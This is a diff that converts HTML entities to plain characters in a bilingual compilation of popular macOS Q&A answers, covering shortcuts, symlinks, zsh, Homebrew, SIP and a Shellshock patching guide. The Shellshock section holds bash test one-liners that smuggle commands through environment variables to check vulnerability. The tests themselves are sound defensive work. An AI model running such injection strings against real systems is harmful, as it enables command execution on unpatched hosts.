@@ -19,7 +19,7 @@ Solution
 Open Terminal, and run the following:
 xcode-select --install
 
-This will pop a dialogue box, Select &quot;Install&quot;, and it will download and install the Command Line Tools package and fix the problem.
+This will pop a dialogue box, Select "Install", and it will download and install the Command Line Tools package and fix the problem.
 (The popped Window may be behind other windows.)
 You do not need Xcode, you can install only the Command Line Tools here, it is about 130 MB (600 MB as of Xcode v14.1).
 If the above alone doesn't do it, then also run:
@@ -31,7 +31,7 @@ sudo xcode-select --switch /Applications/Xcode.app
 sudo xcode-select --switch /Library/Developer/CommandLineTools
 
 I found the solution in this question, Command Line Tools not working.
-You may get an error message: &quot;Can't install the software because it is not currently available from the Software Update server&quot;. In this case xcode-select --reset works as pointed by akozin.
+You may get an error message: "Can't install the software because it is not currently available from the Software Update server". In this case xcode-select --reset works as pointed by akozin.
 
 ---
 
@@ -61,9 +61,9 @@ Solutions include:
 
 Move charging from the left to the right side. If you have a second charger then plug it in on the right side. Avoid plugging everything on the right side (see last paragraph below).
 Unplug something from the left side. Either power or another accessory until the battery is full.
-Force fans to max before plugging in. iStatMenus has an easy Sensors -&gt; Fans menu item to do so. This only helps in marginal conditions.
+Force fans to max before plugging in. iStatMenus has an easy Sensors -> Fans menu item to do so. This only helps in marginal conditions.
 Move to a cooler room.
-If using both laptop display and external display try switching to just one or the other (I switched to external only, laptop lid closed). Some MBP (eg 15&quot; Intel touchbar models) have a design quirk where this config can get hotter than it should.
+If using both laptop display and external display try switching to just one or the other (I switched to external only, laptop lid closed). Some MBP (eg 15" Intel touchbar models) have a design quirk where this config can get hotter than it should.
 
 Proof:
 Actual CPU temperature or application CPU usage is uncorrelated with kernel_task. A hot CPU is throttled by reducing its clock speed, not by scheduling fake no-op load.
@@ -76,7 +76,7 @@ State C shows that simply having stuff plugged in to TB ports raises their tempe
 (all other temperatures were both low and flat. Under 55 degrees.)
 Note that high temperature on the right side appears to be ignored by the OS. Plugging everything into the two right ports instead of the left raised the Right temperatures to over 100 degrees, without the fans coming on. No kernel_task either, but the machine becomes unusable from something throttling.
 Ergo, high CPU usage by kernel_task is caused by high Thunderbolt Left Proximity temperature, which is caused by charging and having normal peripherals plugged in at the same time.
-2017 15&quot; Macbook Pro, MacOS 10.14.5
+2017 15" Macbook Pro, MacOS 10.14.5
 
 To actually answer the question:
 
@@ -104,13 +104,13 @@ To overcome this for non-fullscreen window, use Cmd ⌘Tab as usual and on the i
 You can also achieve this by right-clicking the app's icon in the Dock - this is the only method that will also switch to fullscreen windows, the other methods will not.
 From comments - You can check which key command it is for your language by switching to Finder, then look at the Window menu for 'Cycle through windows'...
 
-BTW, specifically in Chrome, Safari &amp; Firefox, but no other app I know of on Mac,  Cmd ⌘   (number)  will select individual tabs on the frontmost window.
-It also would appear that  Cmd ⌘   `   is yet another of those language-specific shortcuts; so if anyone finds any more variants, please specify for which language &amp; keyboard type.
-If anybody finds new combos for different languages, please check Keyboard layout here - This is a mirror of the very useful old Apple KB page, now gone from Apple How to identify keyboard localizations - &amp; add that as well as which Input Source you use in System Prefs &gt; Keyboard &gt; Input Sources.
+BTW, specifically in Chrome, Safari & Firefox, but no other app I know of on Mac,  Cmd ⌘   (number)  will select individual tabs on the frontmost window.
+It also would appear that  Cmd ⌘   `   is yet another of those language-specific shortcuts; so if anyone finds any more variants, please specify for which language & keyboard type.
+If anybody finds new combos for different languages, please check Keyboard layout here - This is a mirror of the very useful old Apple KB page, now gone from Apple How to identify keyboard localizations - & add that as well as which Input Source you use in System Prefs > Keyboard > Input Sources.
 Add a keyboard picture from the KB page too, if that would help.
 That will make it easier for future Googlers.
 Further info:
-You can change the keys in System Settings… &gt; Keyboard &gt; Keyboard Shortcuts… &gt; Keyboard
+You can change the keys in System Settings… > Keyboard > Keyboard Shortcuts… > Keyboard
 though it doesn't list the reverse direction, it does still work when you add shift to that new combo. I tested by moving mine from  `   (and  ~ ) to  §  (and  ± )
 
 You can use the alternative of  Ctrl ⌃   F4  [visible in the prefs window above] but that almost indiscriminately marches through every single open window on all Spaces, without switching to the correct Space each time. It's really not too useful unless you use a single Space, just included here for completeness.
@@ -123,7 +123,7 @@ You can use the alternative of  Ctrl ⌃   F4  [visible in the prefs window abov
 Tags: macos | Score: 612 | Views: 346411 | Answers: 159
 
 **解决方案 / Solution**:
-In any Finder window or Open/Save dialog, you can hit ⌘&#x21E7;G (just '/' also works in Open/Save) to get a location bar from which you can directly type in the directory to go to. It even supports ~ for home and tab completion.
+In any Finder window or Open/Save dialog, you can hit ⌘⇧G (just '/' also works in Open/Save) to get a location bar from which you can directly type in the directory to go to. It even supports ~ for home and tab completion.
 
 The Open/Save dialog has several other useful shortcuts:
 
@@ -132,18 +132,18 @@ The Open/Save dialog has several other useful shortcuts:
 Reveals the selected item in a new
 Finder window.
 ⌘  I - Info window shows for the selected item.
-⌘  &#x21E7;  > - Shows/Hides hidden files in the dialog
+⌘  ⇧  > - Shows/Hides hidden files in the dialog
 ⌘  F - cursor jumps to the Find text field
 / or ~ - Opens a Go To Folder dialogue. 
-⌘  D or ⌘  &#x21E7; D - selects the ~/Desktop folder as a destination
-⌘  &#x2325;  L - selects ~/Downloads folder as a destination
-⌘  &#x21E7; O - selects ~/Documents folder as a destination
-⌘  &#x2325;  S - Shows/Hides sidebar
+⌘  D or ⌘  ⇧ D - selects the ~/Desktop folder as a destination
+⌘  ⌥  L - selects ~/Downloads folder as a destination
+⌘  ⇧ O - selects ~/Documents folder as a destination
+⌘  ⌥  S - Shows/Hides sidebar
 ⌘  . or esc - Cancels and closes the dialog window
 
 ---
 
-#### 6. Remap &quot;Home&quot; and &quot;End&quot; to beginning and end of line
+#### 6. Remap "Home" and "End" to beginning and end of line
 
 **问题描述 / Problem Description**:
 Tags: macos, keyboard | Score: 587 | Views: 228305 | Answers: 13
@@ -152,17 +152,17 @@ Tags: macos, keyboard | Score: 587 | Views: 228305 | Answers: 13
 The default shortcuts for moving to beginning or end of (wrapped) lines are ⌘← and ⌘→. ⌥↑ and ⌥↓ or ⌃A and ⌃E move to the beginning or end of unwrapped lines (or paragraphs). ⌥← and ⌥→ move backwards/forward by words, and all of these are compatible with holding Shift to select during the corresponding moves.
 You could remap home and end by creating ~/Library/KeyBindings/ and saving a property list like this as DefaultKeyBinding.dict:
 {
-    &quot;\UF729&quot;  = moveToBeginningOfLine:; // home
-    &quot;\UF72B&quot;  = moveToEndOfLine:; // end
-    &quot;$\UF729&quot; = moveToBeginningOfLineAndModifySelection:; // shift-home
-    &quot;$\UF72B&quot; = moveToEndOfLineAndModifySelection:; // shift-end
+    "\UF729"  = moveToBeginningOfLine:; // home
+    "\UF72B"  = moveToEndOfLine:; // end
+    "$\UF729" = moveToBeginningOfLineAndModifySelection:; // shift-home
+    "$\UF72B" = moveToEndOfLineAndModifySelection:; // shift-end
 }
 
 Most of the keybindings for editing text in OS X are defined in /System/Library/Frameworks/AppKit.framework/Resources/StandardKeyBinding.dict.
 Applying changes requires reopening applications. DefaultKeyBinding.dict is ignored by some old versions of Xcode (works with latest version 6.3.1), Terminal, and many cross-platform applications.
 See Cocoa Text System for more information about the customizable keybindings.
-Terminal's keybindings can be customized in Preferences &gt; Profiles &gt; Settings &gt; Keyboard. \033OH moves to the beginning of a line and \033OF to the end of a line.
-In Eclipse, key bindings should be modified in Preferences &gt; General &gt; Keys. You need to modify default bindings for commands Line Start and Line End (replace ⌘← by ↖ and ⌘→ by ↘). For selection to work, also modify Select Line Start and Select Line End.
+Terminal's keybindings can be customized in Preferences > Profiles > Settings > Keyboard. \033OH moves to the beginning of a line and \033OF to the end of a line.
+In Eclipse, key bindings should be modified in Preferences > General > Keys. You need to modify default bindings for commands Line Start and Line End (replace ⌘← by ↖ and ⌘→ by ↘). For selection to work, also modify Select Line Start and Select Line End.
 PS: You may need to logout and login again for the ~/Library/KeyBindings/DefaultKeyBinding.dict change to take effect.
 
 ---
@@ -175,21 +175,21 @@ Tags: macos, mac, spaces, mission-control | Score: 539 | Views: 207135 | Answers
 **解决方案 / Solution**:
 General Solution
 
-System Settings/Preferences &gt; Search for &quot;Spaces&quot; &gt; Uncheck Automatically rearrange Spaces based on most recent use
+System Settings/Preferences > Search for "Spaces" > Uncheck Automatically rearrange Spaces based on most recent use
 
 Newer MacOS Ventura (v13)
 
-System Settings &gt; Desktop &amp; Dock &gt; Scroll down to Mission Control section &gt; Uncheck Automatically rearrange Spaces based on most recent use
+System Settings > Desktop & Dock > Scroll down to Mission Control section > Uncheck Automatically rearrange Spaces based on most recent use
 
 
 
 Older macOS (v12 and older)
-System Preferences &gt; Mission Control
+System Preferences > Mission Control
 Uncheck Automatically rearrange Spaces based on most recent use.
 
 This will fix the order of all your regular Spaces - but not Fullscreen spaces, which always go to the right of existing numbered Spaces.
 
-From comments: Note this cannot fix the Mac confusing which external screen is which. That's not user-controlled at all, &amp; seems to occur mainly [though not always] when the external screens are identical.
+From comments: Note this cannot fix the Mac confusing which external screen is which. That's not user-controlled at all, & seems to occur mainly [though not always] when the external screens are identical.
 Late note:
 This echoes the behaviour of Cmd/Tab or equivalent in most operating systems, so could be considered a 'sensible' default.
  just to save this attracting even more comments on why it was a good/bad choice of default.
@@ -240,11 +240,11 @@ ln -s /path/to/original /path/to/symlink
                   can use . or ~ or other relative paths
 
 
-$ echo content &gt; original
+$ echo content > original
 $ ln -s original symlink
 $ ls -la original symlink
 -rw-r--r--  1 grgarside  staff    8 28 Jan 18:44 original
-lrwxr-xr-x  1 grgarside  staff    8 28 Jan 18:44 symlink -&gt; original
+lrwxr-xr-x  1 grgarside  staff    8 28 Jan 18:44 symlink -> original
 $ cat symlink
 content
 
@@ -255,7 +255,7 @@ The path to the symlink is optional; if omitted, ln defaults to making a link wi
 $ cd ~/Documents
 $ ln -s ../Pictures
 $ ls -l Pictures
-lrwxr-xr-x  1 user  staff  11 Feb  1 17:05 Pictures -&gt; ../Pictures
+lrwxr-xr-x  1 user  staff  11 Feb  1 17:05 Pictures -> ../Pictures
 
 To create a symlink to replace a system directory (e.g. if you want to have /Users pointing to another disk drive), you need to disable System Integrity Protection. You can re-enable it after the symlink is set up.
 
@@ -278,7 +278,7 @@ Output, e.g.:
 Command explanation
 The command you provided, dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com, is a command-line instruction that uses the dig utility to perform a DNS (Domain Name System) lookup. Let's break down the components of the command:
 
-dig: dig stands for &quot;domain information groper,&quot; and it is a command-line tool commonly available on Unix-like systems for querying DNS servers.
+dig: dig stands for "domain information groper," and it is a command-line tool commonly available on Unix-like systems for querying DNS servers.
 
 -4: This option specifies that the command should use IPv4 protocol for the DNS lookup. It ensures that the query is sent using IPv4 instead of IPv6.
 
@@ -369,7 +369,7 @@ Valid sound names are the names of sounds located in…
 
 Posting notifications can be wrapped as a command-line script. The following code can be run in Terminal and will add a script to /usr/local/bin (must exist, add to $PATH) called notify.
 
-cd /usr/local/bin &amp;&amp; echo -e "#!/bin/bash\n/usr/bin/osascript -e \"display notification \\\"\$*\\\"\"" &gt; notify &amp;&amp; chmod +x notify;cd -
+cd /usr/local/bin && echo -e "#!/bin/bash\n/usr/bin/osascript -e \"display notification \\\"\$*\\\"\"" > notify && chmod +x notify;cd -
 
 
 This is the script that the above will add to notify.
@@ -473,8 +473,8 @@ Many of bash's shopt settings have a corresponding setopt in zsh.
 Zsh doesn't treat # as a comment start on the command line by default, only in scripts (including .zshrc and such). To enable interactive comments, run setopt interactive_comments.
 Main differences for scripting
 (and for power users on the command line of course)
-In bash, $foo takes the value of foo, splits it at whitespace characters, and for each whitespace-separated part, if it contains wildcard characters and matches an existing file, replaces the pattern by the list of matches. To just get the value of foo, you need &quot;$foo&quot;. The same applies to command substitution $(foo). In zsh, $foo is the value of foo and $(foo) is the output of foo minus its final newlines, with two exceptions. If a word becomes empty due to expanding empty unquoted variables, it's removed (e.g. a=; b=; printf &quot;%s\n&quot; one &quot;$a$b&quot; three $a$b five prints one, an empty line, three, five). The result of an unquoted command substitution is split at whitespace but the pieces don't undergo wildcard matching.
-Bash arrays are indexed from 0 to (length-1). Zsh arrays are indexed from 1 to length. You can make 0-indexing the default with setopt ksh_arrays. Zsh requires fewer braces (unless ksh_arrays is enabled). For example, suppose a=(first second third &quot;&quot; last).
+In bash, $foo takes the value of foo, splits it at whitespace characters, and for each whitespace-separated part, if it contains wildcard characters and matches an existing file, replaces the pattern by the list of matches. To just get the value of foo, you need "$foo". The same applies to command substitution $(foo). In zsh, $foo is the value of foo and $(foo) is the output of foo minus its final newlines, with two exceptions. If a word becomes empty due to expanding empty unquoted variables, it's removed (e.g. a=; b=; printf "%s\n" one "$a$b" three $a$b five prints one, an empty line, three, five). The result of an unquoted command substitution is split at whitespace but the pieces don't undergo wildcard matching.
+Bash arrays are indexed from 0 to (length-1). Zsh arrays are indexed from 1 to length. You can make 0-indexing the default with setopt ksh_arrays. Zsh requires fewer braces (unless ksh_arrays is enabled). For example, suppose a=(first second third "" last).
 
 
 
@@ -512,8 +512,8 @@ $#a
 
 
 All the elements
-&quot;${a[@]}&quot;
-&quot;${a[@]}&quot; or &quot;${(@)a}&quot;
+"${a[@]}"
+"${a[@]}" or "${(@)a}"
 first second third (empty word) last
 
 
@@ -548,7 +548,7 @@ foo*.odt(e\''REPLY=$REPLY:r.pdf'\'): take the list of files matching foo*.odt, a
 Here are a few useful zsh-specific wildcard patterns.
 
 foo*.txt~foobar*: all .txt files whose name starts with foo but not foobar.
-image&lt;-&gt;.jpg(n): all .jpg files whose base name is image followed by a number, e.g. image3.jpg and image22.jpg but not image-backup.jpg. The glob qualifier (n) causes the files to be listed in numerical order, i.e. image9.jpg comes before image10.jpg (you can make this the default even without -n with setopt numeric_glob_sort).
+image<->.jpg(n): all .jpg files whose base name is image followed by a number, e.g. image3.jpg and image22.jpg but not image-backup.jpg. The glob qualifier (n) causes the files to be listed in numerical order, i.e. image9.jpg comes before image10.jpg (you can make this the default even without -n with setopt numeric_glob_sort).
 
 To mass-rename files, zsh provides a very convenient tool: the zmv function. Suggested for your .zshrc:
 autoload zmv
@@ -579,7 +579,7 @@ An extensive collection of articles on switching to zsh on the mac can be found 
 Tags: macos, network, command-line | Score: 375 | Views: 1062787 | Answers: 7
 
 **解决方案 / Solution**:
-netstat -anvp tcp | awk 'NR&lt;3 || /LISTEN/'
+netstat -anvp tcp | awk 'NR<3 || /LISTEN/'
 Active Internet connections (including servers)
 Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)     rhiwat shiwat    pid   epid  state    options
 tcp46      0      0  *.62981                *.*                    LISTEN      131072 131072  34548      0 0x0100 0x00000006
@@ -607,7 +607,7 @@ Apple has released Bash security fixes for Shellshock and related vulnerabilitie
 
 http://support.apple.com/kb/DL1769 - Mavericks (10.9.5 and above)
 http://support.apple.com/kb/DL1768 - Mountain Lion (10.8.5)
-http://support.apple.com/kb/DL1767 - Lion &amp; Lion Server (10.7.5)
+http://support.apple.com/kb/DL1767 - Lion & Lion Server (10.7.5)
 
 
 (If new patches are released, put them here but please keep these existing ones as well for reference.)
@@ -628,11 +628,11 @@ Many additional vulnerabilities have been reported against bash. According to Mi
 CVE-2014-6271 - original RCE found by Stephane. Fixed by bash43-025
 and corresponding Sep 24 entries for other versions.
 CVE-2014-7169 - file creation / token consumption bug found by
-Tavis. Fixed by bash43-026 &amp; co (Sep 26)
+Tavis. Fixed by bash43-026 & co (Sep 26)
 CVE-2014-7186 - a probably no-sec-risk 10+ here-doc crash found by
-Florian and Todd. Fixed by bash43-028 &amp; co (Oct 1).
+Florian and Todd. Fixed by bash43-028 & co (Oct 1).
 CVE-2014-7187 - a non-crashing, probably no-sec-risk off-by-one
-found by Florian.  Fixed by bash43-028 &amp; co (Oct 1).
+found by Florian.  Fixed by bash43-028 & co (Oct 1).
 CVE-2014-6277 - uninitialized memory issue, almost certainly RCE
 found by Michal Zalewski. No specific patch yet.
 CVE-2014-6278 - command injection RCE found by Michal Zalewski. No specific patch yet.
@@ -671,7 +671,7 @@ Testing for the new Vulnerability
 There has been an update to the original post and Bash 3.2.52(1) is still vulnerable to a variation of the vulnerability, defined in CVE-2014-7169 
 
 $ rm -f echo
-$ env X='() { (a)=&gt;\' sh -c "echo date"; cat echo
+$ env X='() { (a)=>\' sh -c "echo date"; cat echo
 sh: X: line 1: syntax error near unexpected token `='
 sh: X: line 1: `'
 sh: error importing function definition for `X'
@@ -702,7 +702,7 @@ Apple Patch has Game Over vulnerability, sort of
 
 As pointed out by @ake_____ on twitter the official Apple patch is still vulnerable to environment clobbering of executables:
 
-$ env '__BASH_FUNC&lt;ls&gt;()'="() { echo Game Over; }" bash -c ls
+$ env '__BASH_FUNC<ls>()'="() { echo Game Over; }" bash -c ls
 Game Over
 
 
@@ -740,7 +740,7 @@ $ cd bash-92/bash-3.2
 $ curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-052 | patch -p0    
 $ curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-053 | patch -p0  
 $ # See note above about ADD_IMPORT_FUNCTIONS_PATCH
-$ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] &amp;&amp; curl http://alblue.bandlem.com/import_functions.patch | patch -p0
+$ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] && curl http://alblue.bandlem.com/import_functions.patch | patch -p0
 $ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] || curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-054 | patch -p0
 $ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] || curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-055 | patch -p0
 $ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] || curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-056 | patch -p0
@@ -835,7 +835,7 @@ Sometimes it might be required to link them with the --force and --overwrite opt
 brew link --force --overwrite node@14
 
 However, when new node version comes out and you’ll update to it by running brew upgrade, the link will be removed and the most recent node version will be linked instead. To remedy that you might consider adding your desired node version to PATH instead (and restart the shell):
-echo 'export PATH=&quot;/usr/local/opt/node@14/bin:$PATH&quot;' &gt;&gt; ~/.zshrc
+echo 'export PATH="/usr/local/opt/node@14/bin:$PATH"' >> ~/.zshrc
 
 (replace .zshrc with .bashrc or similar, depending on which $SHELL you use)
 
@@ -892,11 +892,11 @@ Tags: macos, temperature, command-line, monitoring | Score: 324 | Views: 574587 
 **解决方案 / Solution**:
 Option #1) you may consider using inbuilt utility powermetrics to get the cpu and gpu temperature and lot more other details.
 To get CPU temperature:
-sudo powermetrics --samplers smc |grep -i &quot;CPU die temperature&quot;
+sudo powermetrics --samplers smc |grep -i "CPU die temperature"
 
 
 To get GPU temperature:
-sudo powermetrics --samplers smc |grep -i &quot;GPU die temperature&quot;
+sudo powermetrics --samplers smc |grep -i "GPU die temperature"
 
 To get lot more details:
 sudo powermetrics
@@ -941,11 +941,11 @@ touch file.txt
 
 Or redirect 'nothing' to a text file
 
-&gt; file.txt
+> file.txt
 
 ---
 
-#### 26. Applications Don&#39;t Show Up in Spotlight
+#### 26. Applications Don't Show Up in Spotlight
 
 **问题描述 / Problem Description**:
 Tags: macos, spotlight | Score: 319 | Views: 141991 | Answers: 7
@@ -992,15 +992,15 @@ https://support.apple.com/en-us/HT201236
 ⌃ Control (or Ctrl)
 
 
-More generally, Mac OS X provides a pane to insert special characters. You'll find it under Edit -&gt; Emoji and Symbols in any program that takes text input. The Command key symbol can be found by searching for it's name &quot;place of interest&quot;. To insert the character, double click it.
+More generally, Mac OS X provides a pane to insert special characters. You'll find it under Edit -> Emoji and Symbols in any program that takes text input. The Command key symbol can be found by searching for it's name "place of interest". To insert the character, double click it.
 
 
 If you're really hardcore and are looking for a way to type the character by entering the Unicode hex code, this is possible:
 
-Go into System Preferences -&gt; Keyboard -&gt; Input Sources, click &quot;+&quot;, scroll to &quot;others&quot;, select &quot;Unicode Hex Input&quot; and click &quot;Add&quot;
+Go into System Preferences -> Keyboard -> Input Sources, click "+", scroll to "others", select "Unicode Hex Input" and click "Add"
 
 
-From the input source selector in the menu bar, select &quot;Unicode Hex Input&quot;
+From the input source selector in the menu bar, select "Unicode Hex Input"
 
 
 To enter a Unicode character, hold down option and type the 4-digit hex code for the character and it will be inserted. In this case, it would be option+2318.
@@ -1029,7 +1029,7 @@ Note that you can also use this technique to find saved passwords for websites o
 
 ---
 
-#### 29. &quot;File Open&quot; dialog is missing sidebar items
+#### 29. "File Open" dialog is missing sidebar items
 
 **问题描述 / Problem Description**:
 Tags: finder, macos, sidebar | Score: 280 | Views: 132876 | Answers: 7
@@ -1053,7 +1053,7 @@ Restarting might not be necessary. As madpoet says:
 
 Alternatively, you can use this Bash oneliner by Christophe Marois:
 
-cd ~/Library/Preferences &amp;&amp; sudo find com.apple.finder.plist* -exec rm {} \; &amp;&amp; killall Finder
+cd ~/Library/Preferences && sudo find com.apple.finder.plist* -exec rm {} \; && killall Finder
 
 ---
 
@@ -1075,7 +1075,7 @@ http://www.pcre.org/
 /usr/local/Cellar/pcre/8.35 (146 files, 5.8M) *
   Poured from bottle
 From: https://github.com/Homebrew/homebrew/blob/master/Library/Formula/pcre.rb
-==&gt; Options
+==> Options
 --universal
     Build a universal binary
 
@@ -1101,7 +1101,7 @@ Depends on: xz
 /usr/local/Cellar/coreutils/8.20 (208 files, 9.4M)
 /usr/local/Cellar/coreutils/8.21 (210 files, 9.6M) *
 https://github.com/mxcl/homebrew/commits/master/Library/Formula/coreutils.rb
-==&gt; Caveats
+==> Caveats
 All commands have been installed with the prefix 'g'.
 
 If you really need to use these commands with their normal names, you
@@ -1223,7 +1223,7 @@ You can use the tmutil tool to delete backups one by one.
 sudo tmutil delete /Volumes/drive_name/Backups.backupdb/mac_name/YYYY-MM-DD-hhmmss
 
 Since tmutil was introduced with Lion, this will not work on earlier OS versions.
-If you want to get the current directory of backups (there can be multiple destinations defined and only one will be &quot;current&quot;)
+If you want to get the current directory of backups (there can be multiple destinations defined and only one will be "current")
 sudo tmutil machinedirectory
 
 If you back up to a network share, you may have sparse bundle storage and if so, that needs to be compacted as well.
@@ -1231,39 +1231,39 @@ sudo hdiutil compact /Volumes/drive_name/Backups.backupdb/mac_name.sparsebundle
 
 ---
 
-#### 36. What is the &quot;rootless&quot; feature in El Capitan, really?
+#### 36. What is the "rootless" feature in El Capitan, really?
 
 **问题描述 / Problem Description**:
 Tags: macos, unix, root, sip | Score: 265 | Views: 186444 | Answers: 3
 
 **解决方案 / Solution**:
-First: the name &quot;rootless&quot; is misleading, since there's still a root account, and you can still access it (the official name, &quot;System Integrity Protection&quot;, is more accurate). What it really does is limit the power of the root account, so that even if you become root, you don't have full control over the system. Essentially, the idea is that it's too easy for malware to get root access (e.g. by presenting an auth dialog to the user, which will cause the user to reflexively enter the admin password). SIP adds another layer of protection, which malware can't penetrate even if it gets root. The bad part of this, of course, it that it must also apply to things you're doing intentionally. But the restrictions it places on root aren't that bad; they don't prevent most &quot;normal&quot; system customization.
+First: the name "rootless" is misleading, since there's still a root account, and you can still access it (the official name, "System Integrity Protection", is more accurate). What it really does is limit the power of the root account, so that even if you become root, you don't have full control over the system. Essentially, the idea is that it's too easy for malware to get root access (e.g. by presenting an auth dialog to the user, which will cause the user to reflexively enter the admin password). SIP adds another layer of protection, which malware can't penetrate even if it gets root. The bad part of this, of course, it that it must also apply to things you're doing intentionally. But the restrictions it places on root aren't that bad; they don't prevent most "normal" system customization.
 Here's what it restricts, even from root:
 
 You can't modify anything in /System, /bin, /sbin, or /usr (except /usr/local); or any of the built-in apps and utilities. Only Installer and software update can modify these areas, and even they only do it when installing Apple-signed packages. But since normal OS X-style customizations go in /Library (or ~/Library, or /Applications), and unix-style customizations (e.g. Homebrew) go in /usr/local (or sometimes /etc or /opt), this shouldn't be a big deal. It also prevents block-level writes to the startup disk, so you can't bypass it that way.
 The full list of restricted directories (and exceptions like /usr/local and a few others) is in /System/Library/Sandbox/rootless.conf. Of course, this file is itself in a restricted area.
-When you upgrade to El Capitan, it moves any &quot;unauthorized&quot; files from restricted areas to /Library/SystemMigration/History/Migration-(some UUID)/QuarantineRoot/.
+When you upgrade to El Capitan, it moves any "unauthorized" files from restricted areas to /Library/SystemMigration/History/Migration-(some UUID)/QuarantineRoot/.
 
 You can't attach to system processes (e.g. those running from those system locations) for things like debugging (or changing what dynamic libraries they load, or some other things). Again, not too much of a big deal; developers can still debug their own programs.
-This does block some significant things like injecting code into the built-in Apple apps (notably the Finder). It also means that dtrace-based tools for system monitoring (e.g. opensnoop) will not be able to monitor &amp; report on many system processes.
+This does block some significant things like injecting code into the built-in Apple apps (notably the Finder). It also means that dtrace-based tools for system monitoring (e.g. opensnoop) will not be able to monitor & report on many system processes.
 
 You can't load kernel extensions (kexts) unless they're properly signed (i.e. by Apple or an Apple-approved developer). Note that this replaces the old system for enforcing kext signing (and the old ways of bypassing it). But since v10.10.4 Apple has had a way to enable trim support for third-party SSDs, the #1 reason to use unsigned kexts has gone away.
 
 Starting in Sierra (10.12), some launchd configuration settings cannot be changed (for example, some launch daemons cannot be unloaded).
 
-Starting in Mojave (10.14), access to users' personal information (email, contacts, etc) is restricted to apps that the user has approved to access that info. This is generally considered a separate feature (called Personal Information Protection, or TCC), but it's based on SIP and disabling SIP disables it as well. See: &quot;What and how does macOS Mojave implement to restrict applications access to personal data?&quot;
+Starting in Mojave (10.14), access to users' personal information (email, contacts, etc) is restricted to apps that the user has approved to access that info. This is generally considered a separate feature (called Personal Information Protection, or TCC), but it's based on SIP and disabling SIP disables it as well. See: "What and how does macOS Mojave implement to restrict applications access to personal data?"
 
-Starting in Catalina (10.15), protection of most system files is strengthened by storing them on a separate read-only volume. This is not strictly part of SIP, and is not disabled by disabling SIP. See: WWDC presentation on &quot;What's New in Apple [Catalina] File Systems&quot; and &quot;What's /System/Volumes/Data?&quot;.
+Starting in Catalina (10.15), protection of most system files is strengthened by storing them on a separate read-only volume. This is not strictly part of SIP, and is not disabled by disabling SIP. See: WWDC presentation on "What's New in Apple [Catalina] File Systems" and "What's /System/Volumes/Data?".
 
-Starting in Big Sur (11.x), the read-only system volume is now a &quot;Sealed System Volume&quot; (a mounted snapshot rather than a regular volume), so making changes to it is even more complicated. See: the Eclectic Light Company article &quot;Big Sur boot volume layout&quot;.
+Starting in Big Sur (11.x), the read-only system volume is now a "Sealed System Volume" (a mounted snapshot rather than a regular volume), so making changes to it is even more complicated. See: the Eclectic Light Company article "Big Sur boot volume layout".
 
 
-If you don't want these restrictions -- either because you want to modify your system beyond what this allows, or because you're developing &amp; debugging something like kexts that aren't practical under these restrictions, you can turn SIP off. Currently this requires rebooting into recovery mode and running the command csrutil disable (and you can similarly re-enable it with csrutil enable).
+If you don't want these restrictions -- either because you want to modify your system beyond what this allows, or because you're developing & debugging something like kexts that aren't practical under these restrictions, you can turn SIP off. Currently this requires rebooting into recovery mode and running the command csrutil disable (and you can similarly re-enable it with csrutil enable).
 Modifying the system volume in Catalina requires disabling SIP, then mounting the volume with write access (and then rebooting and turning SIP back on is recommended). In Big Sur, additional steps are required to disable authentication of the system volume before changes, and afterward create a new snapshot.
 You can also selectively disable parts of SIP. For example, csrutil enable --without kext will disable SIP's kernel extension restriction, but leave its other protections in place.
-But please stop and think before disabling SIP, even temporarily or partially: do you really need to disable it, or is there a better (SIP-compliant) way to do what you want? Do you really need to modify something in /System/Library or /bin or whatever, or could it go in a better place like /Library or /usr/local/bin etc? SIP may &quot;feel&quot; constraining if you aren't used to it, and there are some legitimate reasons to disable it, but a lot of what it enforces it really just best practice anyway.
-To underscore the importance of leaving as much of SIP enabled as much of the time as possible, consider the events of September 23, 2019. Google released an update to Chrome that tried to replace the symbolic link from /var to /private/var. On most systems, SIP blocked this and there were no bad effects. On systems with SIP disabled, it rendered macOS broken and unbootable. The most common reason for disabling SIP was to load unapproved (/improperly signed) kernel extensions (specifically video drivers); if they'd only disabled the kext restriction, they would not have been affected. See the official Google support thread, a superuser Q&amp;A on it, and an Ars Technica article.
-References and further info: WWDC presentation on &quot;Security and Your Apps&quot;, a good explanation by Eldad Eilam on quora.com, the Ars Technica review of El Capitan, and an Apple support article on SIP, and a deep dive by Rich Trouton (who also posted an answer to this question).
+But please stop and think before disabling SIP, even temporarily or partially: do you really need to disable it, or is there a better (SIP-compliant) way to do what you want? Do you really need to modify something in /System/Library or /bin or whatever, or could it go in a better place like /Library or /usr/local/bin etc? SIP may "feel" constraining if you aren't used to it, and there are some legitimate reasons to disable it, but a lot of what it enforces it really just best practice anyway.
+To underscore the importance of leaving as much of SIP enabled as much of the time as possible, consider the events of September 23, 2019. Google released an update to Chrome that tried to replace the symbolic link from /var to /private/var. On most systems, SIP blocked this and there were no bad effects. On systems with SIP disabled, it rendered macOS broken and unbootable. The most common reason for disabling SIP was to load unapproved (/improperly signed) kernel extensions (specifically video drivers); if they'd only disabled the kext restriction, they would not have been affected. See the official Google support thread, a superuser Q&A on it, and an Ars Technica article.
+References and further info: WWDC presentation on "Security and Your Apps", a good explanation by Eldad Eilam on quora.com, the Ars Technica review of El Capitan, and an Apple support article on SIP, and a deep dive by Rich Trouton (who also posted an answer to this question).
 
 ---
 
@@ -1309,7 +1309,7 @@ Select Keyboard and then the Shortcuts tab
 Then on the list that appears select App Shortcuts
 Add new shortcuts like this:
 
-Click on the plus sign to add a new one, the Menu Title field has to match exactly the text that appears on the Window menu in every application: &quot;Move to DISPLAY NAME&quot; (To find the text just open the Window menu on any application)
+Click on the plus sign to add a new one, the Menu Title field has to match exactly the text that appears on the Window menu in every application: "Move to DISPLAY NAME" (To find the text just open the Window menu on any application)
